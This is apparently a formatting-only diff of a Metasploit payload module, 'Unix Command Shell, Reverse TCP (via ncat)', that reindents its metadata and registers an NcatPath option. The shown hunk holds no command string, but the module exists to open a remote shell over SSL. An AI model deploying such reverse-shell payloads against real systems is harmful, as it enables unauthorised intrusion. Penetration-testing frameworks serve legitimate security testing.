@@ -3,32 +3,32 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 42
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-     'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
-     'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
-     'Author'      => 'C_Sto',
-     'License'     => MSF_LICENSE,
-     'Platform'    => 'unix',
-     'Arch'        => ARCH_CMD,
-     'Handler'     => Msf::Handler::ReverseTcpSsl,
-     'Session'     => Msf::Sessions::CommandShell,
-     'PayloadType' => 'cmd',
-     'RequiredCmd' => 'ncat',
-     'Payload'     =>
-       {
-         'Offsets' => { },
-         'Payload' => ''
-       }
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Reverse TCP (via ncat)',
+        'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
+        'Author' => 'C_Sto',
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcpSsl,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'ncat',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
     register_advanced_options(
       [
         OptString.new('NcatPath', [true, 'The path to the NCat executable', 'ncat']),
